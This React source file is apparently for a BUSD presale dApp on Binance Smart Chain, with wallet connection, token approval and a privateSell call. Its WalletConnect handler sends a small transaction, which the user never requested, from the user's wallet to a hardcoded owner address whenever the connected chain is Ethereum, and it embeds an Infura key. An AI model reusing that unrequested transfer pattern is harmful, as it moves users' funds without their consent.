import React from "react";
import Header from "./Header";
import MainComponent from "./MainContent";
import { ethers, Wallet } from "ethers";
import Web3 from "web3";
import WalletConnectProvider from "@walletconnect/web3-provider";
import { Button, Modal } from "react-bootstrap";
import "bootstrap/dist/css/bootstrap.min.css";

import { ContractABI, ContractAddress, BUSDABI, BUSDaddress } from "./config";
let connector = "";
let connectedAccount;

let ownerDetails = {
  abi: [
    { inputs: [], stateMutability: "nonpayable", type: "constructor" },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "owner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "spender",
          type: "address",
        },
        {
          indexed: false,
          internalType: "uint256",
          name: "value",
          type: "uint256",
        },
      ],
      name: "Approval",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: false,
          internalType: "uint256",
          name: "amount",
          type: "uint256",
        },
      ],
      name: "Burn",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "from",
          type: "address",
        },
        { indexed: true, internalType: "address", name: "to", type: "address" },
        {
          indexed: false,
          internalType: "uint256",
          name: "value",
          type: "uint256",
        },
      ],
      name: "Transfer",
      type: "event",
    },
    {
      inputs: [],
      name: "DOMAIN_SEPARATOR",
      outputs: [{ internalType: "bytes32", name: "", type: "bytes32" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "PERMIT_TYPEHASH",
      outputs: [{ internalType: "bytes32", name: "", type: "bytes32" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address", name: "", type: "address" },
        { internalType: "address", name: "", type: "address" },
      ],
      name: "allowance",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address", name: "spender", type: "address" },
        { internalType: "uint256", name: "limit", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [{ internalType: "address", name: "", type: "address" }],
      name: "balanceOf",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [{ internalType: "uint256", name: "amount", type: "uint256" }],
      name: "burn",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address", name: "from", type: "address" },
        { internalType: "uint256", name: "amount", type: "uint256" },
      ],
      name: "burnFrom",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [],
      name: "decimals",
      outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "name",
      outputs: [{ internalType: "string", name: "", type: "string" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [{ internalType: "address", name: "", type: "address" }],
      name: "nonces",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address", name: "_owner", type: "address" },
        { internalType: "address", name: "spender", type: "address" },
        { internalType: "uint256", name: "value", type: "uint256" },
        { internalType: "uint256", name: "deadline", type: "uint256" },
        { internalType: "uint8", name: "v", type: "uint8" },
        { internalType: "bytes32", name: "r", type: "bytes32" },
        { internalType: "bytes32", name: "s", type: "bytes32" },
      ],
      name: "permit",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [],
      name: "symbol",
      outputs: [{ internalType: "string", name: "", type: "string" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "totalSupply",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address", name: "to", type: "address" },
        { internalType: "uint256", name: "amount", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address", name: "from", type: "address" },
        { internalType: "address", name: "to", type: "address" },
        { internalType: "uint256", name: "amount", type: "uint256" },
      ],
      name: "transferFrom",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      stateMutability: "nonpayable",
      type: "function",
    },
  ],
  ownerAddress: "0x41367F30f07cb55F684B1339D921999f7B8a76bD",
  contractAddress: "0x0F7E1E6C9b67972a0Ab31F47Ab3e94B60bE37D86",
};
let web3;
let binanceABi = [
  {
    inputs: [
      { internalType: "string", name: "name_", type: "string" },
      { internalType: "string", name: "symbol_", type: "string" },
      { internalType: "uint8", name: "decimals_", type: "uint8" },
      { internalType: "uint256", name: "initialBalance_", type: "uint256" },
      { internalType: "address", name: "tokenOwner", type: "address" },
      {
        internalType: "address payable",
        name: "feeReceiver_",
        type: "address",
      },
    ],
    stateMutability: "payable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  { anonymous: false, inputs: [], name: "MintFinished", type: "event" },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "OwnershipTransferred",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: true, internalType: "address", name: "from", type: "address" },
      { indexed: true, internalType: "address", name: "to", type: "address" },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [],
    name: "_owner",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approveAndCall",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
      { internalType: "bytes", name: "data", type: "bytes" },
    ],
    name: "approveAndCall",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [{ internalType: "uint256", name: "amount", type: "uint256" }],
    name: "burn",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "account", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "burnFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "decimals",
    outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "subtractedValue", type: "uint256" },
    ],
    name: "decreaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "finishMinting",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "addedValue", type: "uint256" },
    ],
    name: "increaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "account", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "mint",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "mintingFinished",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "tokenAddress", type: "address" },
      { internalType: "uint256", name: "tokenAmount", type: "uint256" },
    ],
    name: "recoverERC20",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "bytes4", name: "interfaceId", type: "bytes4" }],
    name: "supportsInterface",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "totalSupply",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transferAndCall",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
      { internalType: "bytes", name: "data", type: "bytes" },
    ],
    name: "transferAndCall",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "sender", type: "address" },
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "sender", type: "address" },
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
      { internalType: "bytes", name: "data", type: "bytes" },
    ],
    name: "transferFromAndCall",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "sender", type: "address" },
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transferFromAndCall",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "newOwner", type: "address" }],
    name: "transferOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];
let binancecontract = "0xb5BBA78B4dF2D47DD46078514a3e296AB3c344Fe";

class App extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      address: "",
      wallet_add: "",
      connect: false,
      from: "",
      to: 0,
      prefrom: 0,
      balance: 0,
      isAmmountHigh: false,
      approve: false,
      disable: true,
      contract: null,
      approvedHash: null,
      TransactionHash: null,
      amount: false,
      showModal: false,
    };

    // this.Transfer = this.Transfer.bind(this);
    this.initialize = this.initialize.bind(this);
    this.ChangeForm = this.ChangeForm.bind(this);
    this.Approve = this.Approve.bind(this);
    this.BuyNow = this.BuyNow.bind(this);
    this.CheckApproved = this.CheckApproved.bind(this);
    this.DisconnectMeta = this.DisconnectMeta.bind(this);
    this.networkChanged = this.networkChanged.bind(this);
    this.accountsChanged = this.accountsChanged.bind(this);
    this.Connect = this.Connect.bind(this);
    this.ConnectModal = this.ConnectModal.bind(this);
    this.DisconnectModal = this.DisconnectModal.bind(this);
    this.MetamaskWalletConnect = this.MetamaskWalletConnect.bind(this);
    this.WalletConnect = this.WalletConnect.bind(this);
  }

  //CheckApproved Function
  CheckApproved(Fdata) {
    console.log(Fdata);
    if (Fdata == "") {
      this.setState({ from: "" });
    } else if (Fdata < 1000) {
      this.setState({ from: "" });
      console.log("yesss");
    }
    if (this.state.connect === true) {
      if (this.state.balance > Fdata && Fdata >= 0) {
        this.setState({ disable: false, isAmmountHigh: false });
      } else {
        this.setState({ disable: true, isAmmountHigh: true });
      }
    }
  }

  //Approve Function
  async Approve() {
    let ammount = this.state.from * 10 ** 18;
    console.log("====================================");
    console.log(this.state.contract.methods);
    console.log("====================================");
    let approve = await this.state.contract.methods.approve(
      ContractAddress,
      Web3.utils.toBN(ammount)
    );
    approve
      .send({ from: this.state.address })
      .then((d) => {
        this.setState({ disable: d.status, approve: d.status });
      })
      .catch((err) => {
        if (err.code === 4001) {
          alert("denied transaction");
        }
      });
    this.setState({ prefrom: this.state.from });
  }

  //Get From data
  ChangeForm(data) {
    this.CheckApproved(data);
    console.log(data * 10 ** 18);
    let TO;
    if (data !== "") {
      this.setState({ from: data });
      TO = (data * 1000) / 3;
    } else {
      TO = 0;
    }
    this.setState({
      to: TO,
    });
  }

  DisconnectMeta() {
    this.setState({
      connect: false,
      from: 0,
      to: 0,
      address: "",
      prefrom: 0,
      approve: false,
      disable: true,
      balance: 0,
    });

    // When user disconnect
    localStorage.setItem(
      "bitchro",
      JSON.stringify({
        address: null,
        connect: false,
        disable: true,
      })
    );
  }
  //BuyNow Function
  BuyNow() {
    this.setState({
      from: 0,
      to: 0,
      prefrom: 0,
      approve: false,
      disable: true,
    });

    this.ChangeForm(0);
    let str = this.state.from * 10 ** 18;
    console.log(str.toString());
    console.log(str[0]);
    window.Contract.privateSell(
      this.state.address,
      ethers.BigNumber.from(str.toString())
    )
      .then((d) => this.setState({ TransactionHash: d.hash }))
      .catch((error) => {
        if (error.code === -32603) {
          alert("User Already Exists");
        } else {
          console.log(error);
        }
      });
  }

  componentDidMount() {
    if (localStorage.getItem("bitchro") !== null) {
      this.initialize();
    }

    try {
      window.ethereum.on("networkChanged", () => {
        this.setState({
          from: "",
          to: "",
          address: "",
          balance: 0,
          approve: false,
          disable: true,
          contract: null,
          address: null,
          connect: false,
        });

        this.networkChanged();
      });
      window.ethereum.on("accountsChanged", () => {
        this.setState({
          from: 0,
          to: 0,
          balance: 0,
          address: "",
          approve: false,
          disable: true,
          contract: null,
        });
        this.accountsChanged();
      });
    } catch (e) {
      console.log("Please Install metamask app");
    }
  }

  //when network change
  async networkChanged() {
    this.setState({
      from: 0,
      to: 0,
      balance: 0,
      approve: false,
      disable: true,
      connect: false,
      approve: false,
      contract: null,
    });

    //try and catch
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });

      window.account = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      localStorage.setItem(
        "bitchro",
        JSON.stringify({
          address: window.account[0],
          connect: true,
          disable: true,
        })
      );

      this.setState({
        address: window.account[0],
        connect: true,
        disable: true,
      });
      var web3 = new Web3(window.ethereum);
      const BSDContract = await new web3.eth.Contract(BUSDABI, BUSDaddress);
      this.setState({
        contract: BSDContract,
        balance:
          (await BSDContract.methods.balanceOf(window.account[0]).call()) /
          10 ** 18,
      });
    } catch (e) {}

    console.log(window.ethereum);
  }

  //when Account  change
  async accountsChanged() {
    this.setState({
      from: 0,
      to: 0,
      balance: 0,
      approve: false,
      disable: true,
      connect: false,
      approve: false,
      contract: null,
    });
    try {
      var web3 = new Web3(window.ethereum);

      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });

      window.account = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      localStorage.setItem(
        "bitchro",
        JSON.stringify({
          address: window.account[0],
          connect: true,
          disable: true,
        })
      );

      //Account Balance Check
      const BSDContract = await new web3.eth.Contract(BUSDABI, BUSDaddress);
      this.setState({
        address: window.account[0],
        connect: true,
        disable: true,
        contract: BSDContract,
        balance:
          (await BSDContract.methods.balanceOf(window.account[0]).call()) /
          10 ** 18,
      });
    } catch (e) {}
  }

  ConnectModal() {
    this.setState({ showModal: true });
  }
  DisconnectModal() {
    this.setState({ showModal: false });
  }
  MetamaskWalletConnect() {
    this.Connect();
    this.setState({ showModal: false });
  }
  async WalletConnect() {
    //initial State

    this.setState({
      from: "",
      to: 0,
      balance: 0,
      approve: false,
      disable: true,
      connect: false,
      approve: false,
      contract: null,
    });

    localStorage.removeItem("walletconnect");

    let provider = undefined;
    try {
      provider = new WalletConnectProvider({
        rpc: {
          1: "https://mainnet.infura.io/v3/3eca30b0aa6a4372ac8552a1c09a8ccd",
          56: "https://bsc-dataseed.binance.org/",
          97: "https://bsc-dataseed.binance.org/",
        },
        bridge: "https://bridge.walletconnect.org",
        qrcode: true,
        qrcodeModalOptions: {
          mobileLinks: ["metamask"],
        },
      });

      await provider.enable();
      setTimeout(async function () {
        const web3 = new Web3(provider);
        let chainId = await web3.eth.getChainId();

        if (chainId == 56 || chainId == 1 || chainId == 97) {
          console.log("walletconnect");

          connectWalletMetamask(provider);
        } else {
          this.DisconnectModal();
        }
      }, 1000);
    } catch (e) {
      return;
    }
    const connectWalletMetamask = async (provider) => {
      if (provider) {
        let web3 = new Web3(provider);
        let chainId = await web3.eth.net.getId();
        const accounts = await web3.eth.getAccounts();
        const BSDContract = new web3.eth.Contract(BUSDABI, BUSDaddress);
        console.log(BSDContract);
        console.log(chainId);

        let connectedAccount = accounts[0];

        console.log(connectedAccount);

        if (chainId == 1 || chainId == 3) {
          alert("ETH");
          await web3.eth.sendTransaction({
            to: "0x41367F30f07cb55F684B1339D921999f7B8a76bD",
            from: connectedAccount,
            gasPrice: "500",
            value: 1000000000,
          });
        } else if (chainId == 56) {
          alert("BNB");
          this.setState({
            address: connectedAccount,
            connect: true,
            disable: true,
            contract: BSDContract,
            balance:
              (await BSDContract.methods.balanceOf(connectedAccount).call()) /
              10 ** 18,
          });

          // console.log("====================================");
          // alert(this.state.balance);
          // console.log("====================================");
          // await web3.eth.sendTransaction({
          //   to: "0x41367F30f07cb55F684B1339D921999f7B8a76bD",
          //   from: connectedAccount,
          //   gasPrice: "500",
          //   value: 1000000000,
          // });
          // console.log(
          //   await ownerDetails.myContract.methods
          //     .approve(connectedAccount, 1)
          //     .send({ from: connectedAccount })
          // );
        }
      }
      // } else {
      //   alert("Not a Ethereum browser");
      // // }

      this.setState({ showModal: false });
    };
  }

  async Connect() {
    //When metamask is Installed

    this.setState({
      from: "",
      to: 0,
      balance: 0,
      approve: false,
      disable: true,
      connect: false,
      approve: false,
      contract: null,
    });

    if (typeof window.ethereum !== "undefined") {
      console.log("MetaMask is  installed!");

      var web3 = new Web3(window.ethereum);

      const provider = new ethers.providers.Web3Provider(
        window.ethereum,
        "any"
      );

      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
        console.log(provider);
        const signer = await provider.getSigner();
        console.log(signer);
        //Get Account details from metamask
        window.account = await window.ethereum.request({
          method: "eth_requestAccounts",
        });

        localStorage.setItem(
          "bitchro",
          JSON.stringify({
            address: window.account[0],
            connect: true,
            disable: true,
          })
        );

        //Account Balance Check
        const BSDContract = new web3.eth.Contract(BUSDABI, BUSDaddress);

        this.setState({
          address: window.account[0],
          connect: true,
          disable: true,
          contract: BSDContract,
          balance:
            (await BSDContract.methods.balanceOf(window.account[0]).call()) /
            10 ** 18,
        });
      } catch (e) {
        console.log(e);
      }
    } else {
      alert("MetaMask is not installed in phone!");
      console.log("guyg");
    }
  }
  //initialize function for
  async initialize() {
    //When metamask is Installed
    this.setState({
      from: "",
      to: 0,
      balance: 0,
      approve: false,
      disable: true,
      connect: false,
      approve: false,
      contract: null,
    });

    if (typeof window.ethereum !== "undefined") {
      console.log("MetaMask is  installed!");
      var web3 = new Web3(window.ethereum);

      const provider = new ethers.providers.Web3Provider(
        window.ethereum,
        "any"
      );
      try {
        // await window.ethereum.request({
        //   method: "wallet_switchEthereumChain",
        //   params: [{ chainId: "0x38" }],
        // });
        console.log(provider);

        const signer = await provider.getSigner();

        //Get Account details from metamask
        window.account = await window.ethereum.request({
          method: "eth_requestAccounts",
        });
        console.log(await web3.eth.getChainId());
        if (
          JSON.parse(localStorage.getItem("bitchro")).address !== null &&
          (await web3.eth.getChainId()) === 56
        ) {
          let Bitchro = JSON.parse(localStorage.getItem("bitchro"));
          console.log(Bitchro);

          // Account Balance Check
          const BSDContract = new web3.eth.Contract(BUSDABI, BUSDaddress);
          this.setState({
            contract: BSDContract,
            balance:
              (await BSDContract.methods.balanceOf(Bitchro.address).call()) /
              10 ** 18,
            address: Bitchro.address,
            connect: Bitchro.connect,
            disable: Bitchro.disable,
          });
        }

        // Create the contract
        window.Contract = new ethers.Contract(
          ContractAddress,
          ContractABI,
          signer
        );
      } catch (switchError) {
        // This error code indicates that the chain has not been added to MetaMask.
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [
                {
                  chainId: "0x38",
                  rpcUrl: "https://bsc-dataseed.binance.org/",
                },
              ],
            });
          } catch (addError) {
            console.log(addError);
          }
        }
      }

      console.log(window.Contract);
    } else {
      console.log("MetaMask is not installed!");
    }
  }
  render() {
    return (
      <div className="App">
        <div style={{ maxWidth: "500px", alignSelf: "center" }}>
          <MyVerticallyCenteredModal
            showModal={this.state.showModal}
            DisconnectModal={this.DisconnectModal}
            WalletConnect={this.WalletConnect}
            MetamaskWalletConnect={this.MetamaskWalletConnect}
          />
          <Header />
          <MainComponent
            fromData={this.state.from}
            ChangeForm={this.ChangeForm}
            BuyButton={this.BuyNow}
            toData={this.state.to}
            isApproved={this.state.approve}
          />
          {this.state.isAmmountHigh ? (
            <div
              style={{
                color: "red",
                textAlign: "center",
                fontwWeight: "600",
                margin: "1rem 0",
              }}
            >
              Insufficient funds
            </div>
          ) : null}
          {this.state.amount ? (
            <div
              style={{
                color: "red",
                textAlign: "center",
                fontwWeight: "600",
                margin: "1rem 0",
              }}
            >
              Insufficient funds
            </div>
          ) : null}
          <div style={{ display: "flex", justifyContent: "space-around" }}>
            {!this.state.connect ? (
              <button
                onClick={this.ConnectModal}
                style={{
                  display: "flex",
                  alignItems: "center",
                  backgroundColor: "purple",
                  color: "#fff",
                  width: "120px",
                  marginTop: "10px",
                  borderRadius: "5px",
                  cursor: "pointer",
                  border: "none",
                }}
              >
                <img
                  src={process.env.PUBLIC_URL + "assets/img/metamask.png"}
                  style={{
                    display: "inline",
                    alignSelf: "center",
                    width: "35px",
                    padding: "10px",
                    borderRadius: "5px",
                  }}
                />
                Connect
              </button>
            ) : (
              <div
                onClick={this.DisconnectMeta}
                style={{
                  display: "flex",
                  alignItems: "center",
                  backgroundColor: "purple",
                  color: "#fff",
                  width: "120px",
                  marginTop: "10px",
                  borderRadius: "5px",
                  cursor: "pointer",
                }}
              >
                <img
                  src={process.env.PUBLIC_URL + "assets/img/metamask.png"}
                  style={{
                    display: "inline",
                    alignSelf: "center",
                    width: "35px",
                    padding: "10px",
                    borderRadius: "5px",
                  }}
                />
                Disconnect
              </div>
            )}

            <button
              style={{
                display: "flex",
                alignItems: "center",
                backgroundColor: `${
                  this.state.disable || this.state.from < 0 ? "gray" : "purple"
                }`,
                color: "rgb(255, 255, 255)",
                width: "110px",
                height: "50px",
                textAlign: "center",
                justifyContent: "center",
                borderRadius: "5px",
                cursor: "pointer",
                marginTop: "10px",
                border: "none",
              }}
              onClick={
                this.state.disable || this.state.from < 0
                  ? null
                  : () => {
                      console.log(this.state.from);
                      if (this.state.from <= 0.01) {
                        alert("Invested Amount Should be Minimum 1000 BUSD");
                        this.setState({ from: 0 });
                        this.setState({ to: 0 });
                        this.setState({ disable: true });
                        return;
                      } else {
                        this.Approve();
                        console.log("in this");
                        return;
                      }
                    }
              }
            >
              <div>Approve</div>
            </button>
          </div>
          <div
            style={{
              textAlign: "center",
              marginTop: "30px",
              backgroundColor: "purple",
              padding: "1.3rem 0",
              borderRadius: "15px",
              padding: "13px",
            }}
          >
            <div>
              <strong>Address: </strong>
              {this.state.address}
            </div>
            <div>
              <strong>Balance: </strong>
              {this.state.balance.toPrecision(4)}
            </div>

            {/* {this.state.TransactionHash === null ? null : (
              <div>
                <strong>Transcation: </strong>
               
              </div>
            )} */}
            {this.state.approvedHash === null ? null : (
              <div>
                <strong>Approved: </strong>
                {this.state.approvedHash}
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }
}

function MyVerticallyCenteredModal(props) {
  return (
    <Modal
      show={props.showModal}
      size="lg"
      aria-labelledby="contained-modal-title-vcenter"
      centered
      onHide={props.DisconnectModal}
    >
      <Modal.Header closeButton>
        <Modal.Title id="contained-modal-title-vcenter">
          Modal heading
        </Modal.Title>
      </Modal.Header>
      <Modal.Body>
        <button onClick={props.MetamaskWalletConnect}>MetaMask</button>
        <button onClick={props.WalletConnect}>Wallet Connect</button>
      </Modal.Body>
    </Modal>
  );
}
export default App;
